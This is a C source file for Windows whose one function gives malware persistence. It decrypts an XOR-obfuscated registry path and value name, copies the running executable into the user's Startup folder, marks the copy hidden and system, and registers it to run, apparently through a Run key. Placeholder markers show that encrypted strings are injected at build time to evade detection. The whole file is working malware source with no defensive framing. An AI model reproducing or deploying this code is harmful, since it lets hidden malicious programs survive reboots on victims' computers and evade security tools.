#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include "obfuscate.h"

// Placeholders for encrypted strings
//#-XOR_KEY-#                     // will be replaced with #define XOR_KEY 0xXX
//#-ENC_REG_PATH-#                // encrypted registry path
//#-ENC_REG_VALUE_NAME-#          // encrypted registry value name

void add_persistence_reg(void) {
    HKEY hKey;
    char original_path[MAX_PATH];
    char new_path[MAX_PATH];
    char reg_path[256];
    char reg_value_name[64];

    // Decrypt registry path and value name
    xor_string(reg_path, ENC_REG_PATH, sizeof(ENC_REG_PATH), XOR_KEY);
    xor_string(reg_value_name, ENC_REG_VALUE_NAME, sizeof(ENC_REG_VALUE_NAME), XOR_KEY);

    GetModuleFileNameA(NULL, original_path, MAX_PATH);
    
    // Determine destination: Startup folder
    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, new_path))) {
        strcpy(new_path, original_path);
    } else {
        strcat(new_path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
        char *filename = strrchr(original_path, '\\');
        if (filename) filename++;
        else filename = original_path;
        strcat(new_path, filename);
    }
    
    // Copy executable to Startup folder if not already there
    if (strcmp(original_path, new_path) != 0) {
        CopyFileA(original_path, new_path, FALSE);
        SetFileAttributesA(new_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    
    // Write registry key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, reg_value_name, 0, REG_SZ, (BYTE*)new_path, lstrlenA(new_path) + 1);
        RegCloseKey(hKey);
    }
}
